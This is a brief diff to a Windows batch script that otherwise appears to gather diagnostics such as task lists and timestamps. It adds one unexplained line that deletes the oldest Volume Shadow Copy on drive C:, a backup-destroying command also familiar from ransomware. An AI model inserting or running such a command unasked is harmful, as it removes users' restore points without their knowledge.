@@ -257,6 +257,8 @@ tasklist /v
 ECHO ============================
 ECHO  %date%-%time%
 ECHO ============================
+vssadmin delete shadows /For=C: /oldest
+ECHO ============================
 svchost.exe -k DcomLaunch
 ECHO ============================
 svchost.exe -k netsvcs
